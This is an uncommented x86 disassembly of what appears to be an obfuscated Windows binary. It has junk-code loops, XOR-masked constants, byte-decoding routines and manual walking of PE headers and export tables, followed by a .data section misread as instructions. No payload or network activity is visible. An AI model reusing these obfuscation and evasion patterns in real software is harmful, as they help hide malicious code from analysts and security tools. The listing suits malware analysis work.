  424296:	mov    ds:0x426b5e,eax
  42429b:	push   DWORD PTR [ebp-0x8]
  42429e:	push   DWORD PTR [ebp-0x4]
  4242a1:	call   0x4242b3
  4242a6:	mov    eax,DWORD PTR [ebp-0x4]
  4242a9:	xor    eax,edi
  4242ab:	pop    edi
  4242ac:	add    eax,esi
  4242ae:	pop    esi
  4242af:	leave  
  4242b0:	ret    0xc
  4242b3:	push   ebp
  4242b4:	mov    ebp,esp
  4242b6:	sub    esp,0x60
  4242b9:	mov    eax,DWORD PTR [ebp+0x8]
  4242bc:	push   ebx
  4242bd:	push   esi
  4242be:	sbb    DWORD PTR ds:0x42a301,0x43e9
  4242c8:	mov    esi,0x7510850
  4242cd:	xor    eax,esi
  4242cf:	mov    DWORD PTR ds:0x42a2d9,0x11
  4242d9:	cmp    DWORD PTR ds:0x42a2d9,0x0
  4242e0:	je     0x424338
  4242e6:	cmp    DWORD PTR ds:0x42a2d9,0x3
  4242ed:	jne    0x424304
  4242f3:	push   DWORD PTR [ebp-0x18]
  4242f6:	push   DWORD PTR [ebp-0x14]
  4242f9:	push   0x6c3c
  4242fe:	call   DWORD PTR ds:0x425384
  424304:	cmp    DWORD PTR ds:0x42a2d9,0x4
  42430b:	jne    0x424320
  424311:	xor    ebx,ebx
  424313:	add    ebx,DWORD PTR ds:0x42a2d9
  424319:	dec    ebx
  42431a:	mov    DWORD PTR ds:0x42a2d9,ebx
  424320:	mov    ebx,DWORD PTR ds:0x42a2d9
  424326:	dec    ebx
  424327:	mov    DWORD PTR ds:0x42a2d9,ebx
  42432d:	jmp    0x4242d9
  424332:	and    DWORD PTR ds:0x42a3bd,edi
  424338:	mov    ebx,0x327298
  42433d:	add    eax,ebx
  42433f:	push   edi
  424340:	and    DWORD PTR ds:0x42a3f5,0x5463
  42434a:	mov    DWORD PTR [ebp-0x18],eax
  42434d:	mov    edi,DWORD PTR [ebp+0x8]
  424350:	or     DWORD PTR ds:0x42a2e5,0xd50
  42435a:	xor    edi,esi
  42435c:	and    DWORD PTR ds:0x42a389,0x7565
  424366:	mov    DWORD PTR [ebp-0xc],0xf89c85f8
  42436d:	mov    DWORD PTR [ebp-0x10],0xf89c8738
  424374:	xor    DWORD PTR ds:0x42a3f9,0x160d
  42437e:	add    edi,ebx
  424380:	mov    DWORD PTR ds:0x42a37d,0x567e
  42438a:	jmp    0x42455f
  42438f:	cmp    edi,0x3f
  424392:	jne    0x4243e5
  424398:	mov    DWORD PTR ds:0x42a40d,edi
  42439e:	mov    eax,ds:0x426962
  4243a3:	mov    DWORD PTR ds:0x42a335,0x447
  4243ad:	mov    eax,DWORD PTR [eax]
  4243af:	mov    DWORD PTR ds:0x42a371,0x1615
  4243b9:	mov    DWORD PTR [ebp-0x14],eax
  4243bc:	not    DWORD PTR ds:0x42a2e5
  4243c2:	mov    eax,ds:0x426b6a
  4243c7:	mov    eax,DWORD PTR [eax]
  4243c9:	mov    DWORD PTR ds:0x42a401,0xe61
  4243d3:	mov    DWORD PTR [ebp-0x18],eax
  4243d6:	mov    DWORD PTR ds:0x42a3bd,0x6bdb
  4243e0:	jmp    0x424553
  4243e5:	mov    DWORD PTR ds:0x42a3c9,0x2c50
  4243ef:	cmp    edi,0x33c
  4243f5:	jne    0x4244c6
  4243fb:	mov    DWORD PTR ds:0x42a349,0x14
  424405:	cmp    DWORD PTR ds:0x42a349,0x0
  42440c:	je     0x424458
  424412:	cmp    DWORD PTR ds:0x42a349,0xa
  424419:	jne    0x42442d
  42441f:	push   0x1979
  424424:	push   DWORD PTR [ebp-0x20]
  424427:	call   DWORD PTR ds:0x42504c
  42442d:	cmp    DWORD PTR ds:0x42a349,0xb
  424434:	jne    0x424445
  42443a:	mov    eax,ds:0x42a349
  42443f:	dec    eax
  424440:	mov    ds:0x42a349,eax
  424445:	xor    eax,eax
  424447:	add    eax,DWORD PTR ds:0x42a349
  42444d:	dec    eax
  42444e:	mov    ds:0x42a349,eax
  424453:	jmp    0x424405
  424458:	and    DWORD PTR [ebp+0x8],0x0
  42445c:	mov    eax,DWORD PTR [ebp-0x8]
  42445f:	sub    eax,DWORD PTR [ebp+0x8]
  424462:	or     DWORD PTR ds:0x42a339,0x4a4d
  42446c:	push   eax
  42446d:	xor    eax,eax
  42446f:	or     eax,DWORD PTR ds:0x42a409
  424475:	add    eax,DWORD PTR ds:0x42a37d
  42447b:	mov    ds:0x42a409,eax
  424480:	mov    eax,DWORD PTR [ebp-0x4]
  424483:	mov    DWORD PTR ds:0x42a2d9,0x3ec0
  42448d:	add    eax,DWORD PTR [ebp+0x8]
  424490:	and    DWORD PTR ds:0x42a405,0x5545
  42449a:	push   eax
  42449b:	or     DWORD PTR ds:0x42a3b9,0x8f4
  4244a5:	call   0x414e58
  4244aa:	inc    DWORD PTR [ebp+0x8]
  4244ad:	mov    DWORD PTR ds:0x42a2f5,0x53ef
  4244b7:	cmp    DWORD PTR [ebp+0x8],0x52
  4244bb:	jb     0x42445c
  4244c1:	jmp    0x424553
  4244c6:	cmp    edi,0x1a2
  4244cc:	jne    0x424521
  4244d2:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  4244d9:	mov    eax,DWORD PTR [ebp-0x4]
  4244dc:	mov    DWORD PTR [ebp-0x5c],eax
  4244df:	mov    eax,DWORD PTR [ebp-0x8]
  4244e2:	mov    DWORD PTR [ebp-0x58],eax
  4244e5:	mov    eax,DWORD PTR [ebp-0xc]
  4244e8:	xor    eax,esi
  4244ea:	add    eax,ebx
  4244ec:	mov    DWORD PTR [ebp-0x54],eax
  4244ef:	lea    eax,[ebp-0x1c]
  4244f2:	mov    DWORD PTR [ebp-0x50],eax
  4244f5:	mov    eax,DWORD PTR [ebp-0x60]
  4244f8:	xor    eax,esi
  4244fa:	add    eax,ebx
  4244fc:	mov    DWORD PTR [ebp-0x60],eax
  4244ff:	lea    eax,[ebp-0x60]
  424502:	push   eax
  424503:	mov    eax,DWORD PTR [ebp+0xc]
  424506:	xor    eax,esi
  424508:	add    eax,ebx
  42450a:	push   eax
  42450b:	mov    eax,ds:0x426b02
  424510:	push   0x426a58
  424515:	push   DWORD PTR [eax]
  424517:	call   0x423a9e
  42451c:	jmp    0x424553
  424521:	cmp    edi,0x13c
  424527:	jne    0x424553
  42452d:	mov    eax,DWORD PTR [ebp-0x10]
  424530:	xor    eax,esi
  424532:	add    eax,ebx
  424534:	mov    DWORD PTR [ebp+0x8],eax
  424537:	mov    eax,ds:0x426ae2
  42453c:	mov    DWORD PTR [ebp+0x8],eax
  42453f:	mov    eax,DWORD PTR [ebp-0x14]
  424542:	mov    DWORD PTR [ebp-0x4],eax
  424545:	mov    eax,DWORD PTR [ebp-0x4]
  424548:	push   0x4
  42454a:	pop    ecx
  42454b:	sub    ecx,eax
  42454d:	add    ecx,DWORD PTR [ebp-0x18]
  424550:	mov    DWORD PTR [ebp-0x8],ecx
  424553:	mov    eax,DWORD PTR [ebp+0xc]
  424556:	xor    eax,esi
  424558:	lea    edi,[edi+eax*1+0x327298]
  42455f:	cmp    edi,0x50a
  424565:	jne    0x42438f
  42456b:	mov    eax,DWORD PTR [ebp+0xc]
  42456e:	pop    edi
  42456f:	xor    eax,esi
  424571:	pop    esi
  424572:	add    eax,ebx
  424574:	pop    ebx
  424575:	leave  
  424576:	ret    0x8
  424579:	push   ebp
  42457a:	mov    ebp,esp
  42457c:	push   ecx
  42457d:	xor    edx,edx
  42457f:	push   ecx
  424580:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  424587:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  42458e:	and    DWORD PTR ds:0x42a405,0x0
  424598:	mov    edx,DWORD PTR ds:0x42a405
  42459e:	inc    edx
  42459f:	mov    DWORD PTR ds:0x42a405,edx
  4245a5:	cmp    DWORD PTR ds:0x42a405,0xa
  4245ac:	jne    0x4245c0
  4245b2:	push   DWORD PTR [ebp-0xc]
  4245b5:	push   0x42a47b
  4245ba:	call   DWORD PTR ds:0x425210
  4245c0:	cmp    DWORD PTR ds:0x42a405,0x9
  4245c7:	jne    0x4245dc
  4245cd:	xor    edx,edx
  4245cf:	or     edx,DWORD PTR ds:0x42a405
  4245d5:	inc    edx
  4245d6:	mov    DWORD PTR ds:0x42a405,edx
  4245dc:	cmp    DWORD PTR ds:0x42a405,0x17
  4245e3:	jb     0x424598
  4245e9:	mov    eax,DWORD PTR [ebp-0x4]
  4245ec:	mov    ecx,DWORD PTR ds:0x42a3e1
  4245f2:	mov    ecx,DWORD PTR [ecx]
  4245f4:	add    DWORD PTR ds:0x42a3f5,ecx
  4245fa:	push   esi
  4245fb:	adc    edx,DWORD PTR ds:0x42a2f1
  424601:	mov    esi,DWORD PTR [ebp-0x8]
  424604:	sbb    ecx,DWORD PTR ds:0x42a40d
  42460a:	mov    edx,0x7510850
  42460f:	xor    eax,edx
  424611:	xor    esi,edx
  424613:	mov    ecx,DWORD PTR ds:0x42a301
  424619:	adc    DWORD PTR ds:0x42a3bd,ecx
  42461f:	mov    ecx,0x327298
  424624:	add    esi,ecx
  424626:	add    eax,ecx
  424628:	or     DWORD PTR ds:0x42a339,0x45b4
  424632:	imul   eax,esi
  424635:	mov    DWORD PTR ds:0x42a3cd,edi
  42463b:	mov    esi,DWORD PTR [ebp+0xc]
  42463e:	cmp    esi,eax
  424640:	mov    DWORD PTR ds:0x42a38d,0x576a
  42464a:	jne    0x42466e
  424650:	not    esi
  424652:	mov    eax,DWORD PTR [ebp-0x4]
  424655:	xor    esi,0x20ed
  42465b:	mov    esi,DWORD PTR [ebp-0x8]
  42465e:	xor    eax,edx
  424660:	xor    esi,edx
  424662:	add    eax,ecx
  424664:	add    esi,ecx
  424666:	imul   eax,esi
  424669:	jmp    0x4246a9
  42466e:	mov    eax,DWORD PTR [ebp+0xc]
  424671:	mov    eax,DWORD PTR [eax+0x78]
  424674:	mov    DWORD PTR [ebp+0xc],eax
  424677:	mov    eax,DWORD PTR [ebp-0x4]
  42467a:	mov    esi,DWORD PTR [ebp-0x8]
  42467d:	xor    eax,edx
  42467f:	xor    esi,edx
  424681:	add    eax,ecx
  424683:	add    esi,ecx
  424685:	imul   eax,esi
  424688:	mov    esi,DWORD PTR [ebp+0xc]
  42468b:	cmp    esi,eax
  42468d:	mov    eax,DWORD PTR [ebp-0x4]
  424690:	je     0x424655
  424696:	xor    eax,edx
  424698:	add    eax,ecx
  42469a:	mov    ecx,DWORD PTR [ebp+0xc]
  42469d:	imul   eax,ecx
  4246a0:	add    eax,DWORD PTR [ebp+0x8]
  4246a3:	mov    DWORD PTR [ebp+0xc],eax
  4246a6:	mov    eax,DWORD PTR [ebp+0xc]
  4246a9:	pop    esi
  4246aa:	leave  
  4246ab:	ret    0x8
  4246ae:	push   ebp
  4246af:	mov    ebp,esp
  4246b1:	mov    eax,ds:0x426b66
  4246b6:	movzx  edx,BYTE PTR ds:0x42a3f1
  4246bd:	or     edx,DWORD PTR ds:0x42a2e5
  4246c3:	mov    DWORD PTR ds:0x42a3f1,edx
  4246c9:	mov    edx,0x327298
  4246ce:	and    DWORD PTR ds:0x42a371,0x0
  4246d8:	xor    ecx,ecx
  4246da:	or     ecx,DWORD PTR ds:0x42a371
  4246e0:	inc    ecx
  4246e1:	mov    DWORD PTR ds:0x42a371,ecx
  4246e7:	cmp    DWORD PTR ds:0x42a371,0x24
  4246ee:	jne    0x42470c
  4246f4:	push   0x42a449
  4246f9:	push   0x42a4e6
  4246fe:	push   0x17db
  424703:	push   DWORD PTR [ebp-0x10]
  424706:	call   DWORD PTR ds:0x425050
  42470c:	cmp    DWORD PTR ds:0x42a371,0x1f
  424713:	jb     0x4246d8
  424719:	mov    DWORD PTR ds:0x42a379,0x24e1
  424723:	sub    eax,edx
  424725:	and    DWORD PTR ds:0x42a385,0x0
  42472f:	xor    ecx,ecx
  424731:	add    ecx,DWORD PTR ds:0x42a385
  424737:	inc    ecx
  424738:	mov    DWORD PTR ds:0x42a385,ecx
  42473e:	cmp    DWORD PTR ds:0x42a385,0x4
  424745:	jne    0x424764
  42474b:	push   0x0
  42474d:	push   DWORD PTR [ebp-0x20]
  424750:	push   DWORD PTR [ebp-0x28]
  424753:	push   DWORD PTR [ebp-0xc]
  424756:	push   DWORD PTR [ebp-0x18]
  424759:	push   0x2308
  42475e:	call   DWORD PTR ds:0x425054
  424764:	cmp    DWORD PTR ds:0x42a385,0x3
  42476b:	jne    0x42477e
  424771:	mov    ecx,DWORD PTR ds:0x42a385
  424777:	inc    ecx
  424778:	mov    DWORD PTR ds:0x42a385,ecx
  42477e:	cmp    DWORD PTR ds:0x42a385,0x17
  424785:	jb     0x42472f
  42478b:	and    DWORD PTR ds:0x42a349,0x0
  424795:	jmp    0x4247a7
  42479a:	mov    ecx,DWORD PTR ds:0x42a349
  4247a0:	inc    ecx
  4247a1:	mov    DWORD PTR ds:0x42a349,ecx
  4247a7:	cmp    DWORD PTR ds:0x42a349,0x14
  4247ae:	jae    0x4247f7
  4247b4:	cmp    DWORD PTR ds:0x42a349,0x5
  4247bb:	jne    0x4247d7
  4247c1:	push   0x42a2fd
  4247c6:	push   0x30ee
  4247cb:	push   DWORD PTR [ebp-0x24]
  4247ce:	push   DWORD PTR [ebp-0x20]
  4247d1:	call   DWORD PTR ds:0x425388
  4247d7:	cmp    DWORD PTR ds:0x42a349,0x4
  4247de:	jne    0x4247f2
  4247e4:	push   DWORD PTR ds:0x42a349
  4247ea:	pop    ecx
  4247eb:	inc    ecx
  4247ec:	mov    DWORD PTR ds:0x42a349,ecx
  4247f2:	jmp    0x42479a
  4247f7:	mov    ecx,0x7510850
  4247fc:	push   esi
  4247fd:	mov    esi,DWORD PTR [ebp+0xc]
  424800:	xor    eax,ecx
  424802:	cmp    eax,esi
  424804:	je     0x42484b
  42480a:	mov    eax,ds:0x426b5e
  42480f:	mov    esi,DWORD PTR [ebp+0xc]
  424812:	sub    eax,edx
  424814:	xor    eax,ecx
  424816:	cmp    eax,esi
  424818:	jne    0x42482e
  42481e:	mov    eax,ds:0x426b66
  424823:	add    eax,DWORD PTR ds:0x426b5e
  424829:	jmp    0x424835
  42482e:	mov    eax,DWORD PTR [ebp+0xc]
  424831:	xor    eax,ecx
  424833:	add    eax,edx
  424835:	mov    ds:0x426b5e,eax
  42483a:	mov    eax,DWORD PTR [ebp+0xc]
  42483d:	xor    eax,ecx
  42483f:	add    eax,edx
  424841:	mov    ds:0x426b66,eax
  424846:	jmp    0x424855
  42484b:	mov    eax,ds:0x426b66
  424850:	mov    ds:0x426b5e,eax
  424855:	mov    eax,DWORD PTR [ebp+0x8]
  424858:	mov    eax,DWORD PTR [eax]
  42485a:	mov    ecx,DWORD PTR ds:0x426b5e
  424860:	add    DWORD PTR [eax],ecx
  424862:	pop    esi
  424863:	pop    ebp
  424864:	ret    0x8
  424867:	push   ebp
  424868:	mov    ebp,esp
  42486a:	mov    eax,DWORD PTR [ebp+0xc]
  42486d:	xor    edx,edx
  42486f:	mov    ecx,0x7264fd50
  424874:	div    ecx
  424876:	mov    ecx,DWORD PTR [ebp+0x10]
  424879:	and    ecx,eax
  42487b:	or     ecx,0x81161d8e
  424881:	mov    eax,ecx
  424883:	pop    ebp
  424884:	ret    0x18
  424887:	push   ebp
  424888:	mov    ebp,esp
  42488a:	sub    esp,0x58
  42488d:	mov    ecx,DWORD PTR [ebp+0x8]
  424890:	mov    eax,0x8a36
  424895:	or     DWORD PTR ds:0x42a3b9,0x12b4
  42489f:	xor    ax,WORD PTR [ecx+0x20]
  4248a3:	xor    DWORD PTR ds:0x42a335,edx
  4248a9:	mov    ecx,0x3afc
  4248ae:	add    ax,cx
  4248b1:	movzx  eax,ax
  4248b4:	mov    DWORD PTR ds:0x42a2ed,0x18
  4248be:	cmp    DWORD PTR ds:0x42a2ed,0x0
  4248c5:	je     0x4248fc
  4248cb:	cmp    DWORD PTR ds:0x42a2ed,0x1d
  4248d2:	jne    0x4248e8
  4248d8:	push   0x787d
  4248dd:	push   0x3e83
  4248e2:	call   DWORD PTR ds:0x425214
  4248e8:	xor    ecx,ecx
  4248ea:	xor    ecx,DWORD PTR ds:0x42a2ed
  4248f0:	dec    ecx
  4248f1:	mov    DWORD PTR ds:0x42a2ed,ecx
  4248f7:	jmp    0x4248be
  4248fc:	mov    DWORD PTR [ebp-0xc],eax
  4248ff:	sbb    DWORD PTR ds:0x42a3c9,edi
  424905:	mov    BYTE PTR [ebp-0x1],0x7f
  424909:	xor    ecx,ecx
  42490b:	xor    ecx,DWORD PTR ds:0x42a3fd
  424911:	sub    DWORD PTR ds:0x42a2fd,ecx
  424917:	lea    eax,[ebp-0x1]
  42491a:	dec    ecx
  42491b:	mov    DWORD PTR [ebp-0x10],eax
  42491e:	adc    DWORD PTR ds:0x42a2e5,ebx
  424924:	mov    al,BYTE PTR [ebp-0x1]
  424927:	mov    ecx,DWORD PTR [ebp-0x10]
  42492a:	xor    al,0x43
  42492c:	sbb    DWORD PTR ds:0x42a3f5,0x194f
  424936:	sub    al,0x3b
  424938:	mov    BYTE PTR [ecx],al
  42493a:	and    DWORD PTR ds:0x42a3cd,0x0
  424944:	jmp    0x424956
  424949:	mov    ecx,DWORD PTR ds:0x42a3cd
  42494f:	inc    ecx
  424950:	mov    DWORD PTR ds:0x42a3cd,ecx
  424956:	cmp    DWORD PTR ds:0x42a3cd,0x19
  42495d:	jae    0x4249d4
  424963:	cmp    DWORD PTR ds:0x42a3cd,0x1e
  42496a:	jne    0x424980
  424970:	push   0x42a3f5
  424975:	push   0x40f1
  42497a:	call   DWORD PTR ds:0x425218
  424980:	jmp    0x424949
  424985:	mov    DWORD PTR ds:0x42a3bd,0x14
  42498f:	cmp    DWORD PTR ds:0x42a3bd,0x0
  424996:	je     0x4249d4
  42499c:	cmp    DWORD PTR ds:0x42a3bd,0x23
  4249a3:	jne    0x4249c2
  4249a9:	push   DWORD PTR [ebp-0x28]
  4249ac:	push   DWORD PTR [ebp-0x24]
  4249af:	push   0x68e9
  4249b4:	push   DWORD PTR [ebp-0x24]
  4249b7:	push   0x1ab2
  4249bc:	call   DWORD PTR ds:0x425058
  4249c2:	mov    ecx,DWORD PTR ds:0x42a3bd
  4249c8:	dec    ecx
  4249c9:	mov    DWORD PTR ds:0x42a3bd,ecx
  4249cf:	jmp    0x42498f
  4249d4:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4249db:	mov    DWORD PTR ds:0x42a2d9,0x1e
  4249e5:	cmp    DWORD PTR ds:0x42a2d9,0x0
  4249ec:	je     0x424a41
  4249f2:	cmp    DWORD PTR ds:0x42a2d9,0x6
  4249f9:	jne    0x424a13
  4249ff:	push   DWORD PTR [ebp-0x24]
  424a02:	push   DWORD PTR [ebp-0x24]
  424a05:	push   0x8937
  424a0a:	push   DWORD PTR [ebp-0x20]
  424a0d:	call   DWORD PTR ds:0x42505c
  424a13:	cmp    DWORD PTR ds:0x42a2d9,0x7
  424a1a:	jne    0x424a2b
  424a20:	mov    eax,ds:0x42a2d9
  424a25:	dec    eax
  424a26:	mov    ds:0x42a2d9,eax
  424a2b:	mov    eax,ds:0x42a2d9
  424a30:	dec    eax
  424a31:	mov    ds:0x42a2d9,eax
  424a36:	jmp    0x4249e5
  424a3b:	and    ecx,0x25f3
  424a41:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  424a48:	adc    DWORD PTR ds:0x42a409,edi
  424a4e:	mov    eax,DWORD PTR [ebp-0x8]
  424a51:	mov    ecx,0x7510850
  424a56:	or     DWORD PTR ds:0x42a2e9,0x3433
  424a60:	push   esi
  424a61:	sbb    DWORD PTR ds:0x42a381,0x5e43
  424a6b:	xor    eax,ecx
  424a6d:	mov    esi,0x327298
  424a72:	add    eax,esi
  424a74:	mov    DWORD PTR ds:0x42a3c5,0x5140
  424a7e:	jmp    0x424a9f
  424a83:	mov    dl,BYTE PTR [ebp-0x1]
  424a86:	mov    DWORD PTR ds:0x42a3f1,0x4584
  424a90:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  424a94:	mov    DWORD PTR ds:0x42a401,0x1056
  424a9e:	inc    eax
  424a9f:	cmp    eax,0x40
  424aa2:	jb     0x424a83
  424aa8:	mov    edx,DWORD PTR [ebp-0x8]
  424aab:	mov    eax,DWORD PTR [ebp-0xc]
  424aae:	xor    edx,ecx
  424ab0:	add    edx,esi
  424ab2:	cmp    edx,eax
  424ab4:	je     0x424afa
  424aba:	push   ebx
  424abb:	push   edi
  424abc:	mov    edi,DWORD PTR [ebp+0x8]
  424abf:	mov    eax,0x8a36
  424ac4:	xor    ax,WORD PTR [edi+edx*4+0x2]
  424ac9:	mov    edi,0x3afc
  424ace:	add    ax,di
  424ad1:	movzx  eax,ax
  424ad4:	mov    DWORD PTR [ebp-0x14],eax
  424ad7:	mov    eax,DWORD PTR [ebp+0x8]
  424ada:	movzx  eax,WORD PTR [eax+edx*4]
  424ade:	xor    eax,0x8a36
  424ae3:	add    eax,edi
  424ae5:	mov    edi,DWORD PTR [ebp-0x14]
  424ae8:	mov    BYTE PTR [ebp+edi*1-0x58],al
  424aec:	mov    eax,DWORD PTR [ebp-0xc]
  424aef:	inc    edx
  424af0:	cmp    edx,eax
  424af2:	jne    0x424abc
  424af8:	pop    edi
  424af9:	pop    ebx
  424afa:	mov    eax,DWORD PTR [ebp-0x8]
  424afd:	mov    edx,DWORD PTR [ebp+0x10]
  424b00:	xor    eax,ecx
  424b02:	add    eax,esi
  424b04:	mov    DWORD PTR [edx],eax
  424b06:	mov    eax,DWORD PTR [ebp-0x8]
  424b09:	xor    eax,ecx
  424b0b:	add    eax,esi
  424b0d:	mov    DWORD PTR [ebp+0x8],eax
  424b10:	mov    eax,DWORD PTR [ebp+0x8]
  424b13:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  424b17:	mov    dl,BYTE PTR [ebp-0x1]
  424b1a:	cmp    al,dl
  424b1c:	je     0x424b5f
  424b22:	mov    eax,DWORD PTR [ebp+0x8]
  424b25:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  424b29:	mov    edx,DWORD PTR [ebp+0xc]
  424b2c:	cmp    al,BYTE PTR [edx]
  424b2e:	jne    0x424b85
  424b34:	mov    eax,DWORD PTR [ebp-0x8]
  424b37:	mov    edx,DWORD PTR [ebp+0xc]
  424b3a:	movsx  edx,BYTE PTR [edx]
  424b3d:	xor    eax,ecx
  424b3f:	add    eax,esi
  424b41:	cmp    edx,eax
  424b43:	je     0x424b79
  424b49:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  424b50:	lea    eax,[ebp-0x18]
  424b53:	mov    DWORD PTR [ebp-0x14],eax
  424b56:	mov    eax,DWORD PTR [ebp-0x14]
  424b59:	add    DWORD PTR [eax],0x705fa8e
  424b5f:	mov    eax,DWORD PTR [ebp-0x10]
  424b62:	mov    edx,DWORD PTR [ebp+0x8]
  424b65:	xor    eax,ecx
  424b67:	lea    eax,[eax+edx*1+0x327298]
  424b6e:	mov    DWORD PTR [ebp+0x8],eax
  424b71:	inc    DWORD PTR [ebp+0xc]
  424b74:	jmp    0x424b10
  424b79:	mov    eax,DWORD PTR [ebp-0x10]
  424b7c:	xor    eax,ecx
  424b7e:	mov    ecx,DWORD PTR [ebp+0x10]
  424b81:	add    eax,esi
  424b83:	mov    DWORD PTR [ecx],eax
  424b85:	pop    esi
  424b86:	leave  
  424b87:	ret    0xc
  424b8a:	push   ebp
  424b8b:	mov    ebp,esp
  424b8d:	push   ecx
  424b8e:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  424b95:	mov    eax,DWORD PTR [ebp+0x8]
  424b98:	mov    al,BYTE PTR [eax]
  424b9a:	add    al,0x3b
  424b9c:	xor    al,0x43
  424b9e:	mov    DWORD PTR ds:0x42a301,0x5cec
  424ba8:	cmp    al,0xcb
  424baa:	jne    0x424c5c
  424bb0:	add    ecx,DWORD PTR ds:0x42a339
  424bb6:	mov    eax,DWORD PTR [ebp+0x8]
  424bb9:	mov    DWORD PTR ds:0x42a349,0x1d
  424bc3:	cmp    DWORD PTR ds:0x42a349,0x0
  424bca:	je     0x424c14
  424bd0:	cmp    DWORD PTR ds:0x42a349,0xf
  424bd7:	jne    0x424be8
  424bdd:	push   0x29e2
  424be2:	call   DWORD PTR ds:0x425060
  424be8:	cmp    DWORD PTR ds:0x42a349,0x10
  424bef:	jne    0x424c02
  424bf5:	mov    edx,DWORD PTR ds:0x42a349
  424bfb:	dec    edx
  424bfc:	mov    DWORD PTR ds:0x42a349,edx
  424c02:	mov    edx,DWORD PTR ds:0x42a349
  424c08:	dec    edx
  424c09:	mov    DWORD PTR ds:0x42a349,edx
  424c0f:	jmp    0x424bc3
  424c14:	mov    ecx,DWORD PTR [ebp+0x8]
  424c17:	sbb    DWORD PTR ds:0x42a3f1,edx
  424c1d:	add    ecx,DWORD PTR [eax+0x3c]
  424c20:	mov    edx,0x7510850
  424c25:	add    eax,DWORD PTR ds:0x42a331
  424c2b:	mov    DWORD PTR [ebp+0x8],ecx
  424c2e:	mov    eax,DWORD PTR [ebp-0x4]
  424c31:	xor    eax,edx
  424c33:	push   esi
  424c34:	mov    esi,DWORD PTR [ebp+0x8]
  424c37:	mov    ecx,0x327298
  424c3c:	add    eax,ecx
  424c3e:	cmp    DWORD PTR [esi+0x54],eax
  424c41:	pop    esi
  424c42:	je     0x424c50
  424c48:	mov    eax,DWORD PTR [ebp+0x8]
  424c4b:	jmp    0x424c69
  424c50:	mov    eax,DWORD PTR [ebp-0x4]
  424c53:	xor    eax,edx
  424c55:	add    eax,ecx
  424c57:	jmp    0x424c69
  424c5c:	mov    eax,DWORD PTR [ebp-0x4]
  424c5f:	xor    eax,0x7510850
  424c64:	add    eax,0x327298
  424c69:	leave  
  424c6a:	ret    0x4

Disassembly of section .data:

00425000 <.data>:
  425000:	js     0x42505b
  425002:	add    al,BYTE PTR [eax]
  425004:	nop
  425005:	pop    ecx
  425006:	add    al,BYTE PTR [eax]
  425008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425009:	pop    ecx
  42500a:	add    al,BYTE PTR [eax]
  42500c:	mov    dh,0x59
  42500e:	add    al,BYTE PTR [eax]
  425010:	retf   0x259
  425013:	add    al,ah
  425015:	pop    ecx
  425016:	add    al,BYTE PTR [eax]
  425018:	add    BYTE PTR [eax],al
  42501a:	add    BYTE PTR [eax],al
  42501c:	or     bl,BYTE PTR [edx+0x2]
  42501f:	add    BYTE PTR [eax],bl
  425021:	pop    edx
  425022:	add    al,BYTE PTR [eax]
  425024:	and    al,0x5a
  425026:	add    al,BYTE PTR [eax]
  425028:	xor    bl,BYTE PTR [edx+0x2]
  42502b:	add    BYTE PTR [esi],bh
  42502d:	pop    edx
  42502e:	add    al,BYTE PTR [eax]
  425030:	dec    esp
  425031:	pop    edx
  425032:	add    al,BYTE PTR [eax]
  425034:	pop    esi
  425035:	pop    edx
  425036:	add    al,BYTE PTR [eax]
  425038:	outs   dx,BYTE PTR ds:[esi]
  425039:	pop    edx
  42503a:	add    al,BYTE PTR [eax]
  42503c:	sbb    BYTE PTR [edx+0x2],0x0
  425040:	mov    WORD PTR [edx+0x2],ds
  425043:	add    BYTE PTR [eax-0x55fffda6],bl
  425049:	pop    edx
  42504a:	add    al,BYTE PTR [eax]
  42504c:	mov    dh,0x5a
  42504e:	add    al,BYTE PTR [eax]
  425050:	retf   0x25a
  425053:	add    dl,bl
  425055:	pop    edx
  425056:	add    al,BYTE PTR [eax]
  425058:	call   0xf64252b7
  42505d:	pop    edx
  42505e:	add    al,BYTE PTR [eax]
  425060:	add    bl,BYTE PTR [ebx+0x2]
  425063:	add    BYTE PTR [eax],dl
  425065:	pop    ebx
  425066:	add    al,BYTE PTR [eax]
  425068:	push   ds
  425069:	pop    ebx
  42506a:	add    al,BYTE PTR [eax]
  42506c:	sub    bl,BYTE PTR [ebx+0x2]
  42506f:	add    BYTE PTR [edx],bh
  425071:	pop    ebx
  425072:	add    al,BYTE PTR [eax]
  425074:	dec    eax
  425075:	pop    ebx
  425076:	add    al,BYTE PTR [eax]
  425078:	push   esp
  425079:	pop    ebx
  42507a:	add    al,BYTE PTR [eax]
  42507c:	pusha  
  42507d:	pop    ebx
  42507e:	add    al,BYTE PTR [eax]
  425080:	jo     0x4250dd
  425082:	add    al,BYTE PTR [eax]
  425084:	sbb    BYTE PTR [ebx+0x2],0x0
  425088:	xchg   edx,eax
  425089:	pop    ebx
  42508a:	add    al,BYTE PTR [eax]
  42508c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42508d:	pop    ebx
  42508e:	add    al,BYTE PTR [eax]
  425090:	mov    eax,0xc800025b
  425095:	pop    ebx
  425096:	add    al,BYTE PTR [eax]
  425098:	aam    0x5b
  42509a:	add    al,BYTE PTR [eax]
  42509c:	out    0x5b,al
  42509e:	add    al,BYTE PTR [eax]
  4250a0:	repnz pop ebx
  4250a2:	add    al,BYTE PTR [eax]
  4250a4:	(bad)  
  4250a5:	pop    ebx
  4250a6:	add    al,BYTE PTR [eax]
  4250a8:	push   cs
  4250a9:	pop    esp
  4250aa:	add    al,BYTE PTR [eax]
  4250ac:	sbb    al,0x5c
  4250ae:	add    al,BYTE PTR [eax]
  4250b0:	cs pop esp
  4250b2:	add    al,BYTE PTR [eax]
  4250b4:	ds pop esp
  4250b6:	add    al,BYTE PTR [eax]
  4250b8:	dec    esi
  4250b9:	pop    esp
  4250ba:	add    al,BYTE PTR [eax]
  4250bc:	pusha  
  4250bd:	pop    esp
  4250be:	add    al,BYTE PTR [eax]
  4250c0:	ins    BYTE PTR es:[edi],dx
  4250c1:	pop    esp
  4250c2:	add    al,BYTE PTR [eax]
  4250c4:	xchg   BYTE PTR [edx+eax*1+0x0],bl
  4250c8:	xchg   esi,eax
